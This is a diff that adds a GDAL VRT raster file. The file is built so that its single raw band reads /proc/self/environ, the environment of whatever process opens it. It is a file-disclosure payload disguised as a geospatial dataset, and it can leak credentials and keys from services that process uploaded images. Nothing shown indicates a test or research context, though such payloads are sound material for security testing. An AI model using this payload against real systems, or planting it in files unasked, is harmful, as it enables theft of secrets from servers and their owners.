@@ -1,0 +1,11 @@
+<VRTDataset rasterXSize="2048" rasterYSize="2">
+  <SRS>EPSG:4326</SRS>
+  <GeoTransform>0.0, 1.0, 0.0, 0.0, 0.0, -1.0</GeoTransform>
+  <VRTRasterBand dataType="Byte" band="1" subClass="VRTRawRasterBand">
+    <SourceFilename relativeToVRT="0">/proc/self/environ</SourceFilename>
+    <ImageOffset>0</ImageOffset>
+    <PixelOffset>1</PixelOffset>
+    <LineOffset>2048</LineOffset>
+    <ByteOrder>LSB</ByteOrder>
+  </VRTRasterBand>
+</VRTDataset>
